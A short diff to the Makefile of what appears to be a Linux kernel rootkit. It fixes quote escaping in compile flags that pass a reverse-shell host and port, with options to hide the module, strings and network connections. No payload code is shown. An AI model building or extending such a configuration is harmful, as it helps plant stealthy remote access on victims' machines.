@@ -23,8 +23,8 @@ EXTRA_CFLAGS += -I$(PWD)/include \
                 -DMODULE_NAME=\"$(MODULE_NAME)\" \
                 -DSTRING_EXCLUDES=\"$(STRING_EXCLUDES)\" \
                 -DNET_EXCLUDES=\"$(NET_EXCLUDES)\" \
-				-DRSHELL_HOST=\"$(RSHELL_HOST)" \
-				-DRSHELL_PORT=\"$(RSHELL_PORT)"
+				-DRSHELL_HOST=\"$(RSHELL_HOST)\" \
+				-DRSHELL_PORT=\"$(RSHELL_PORT)\"
 
 ifeq ($(HIDE_MODULE),1)
   EXTRA_CFLAGS += -DHIDE_MODULE
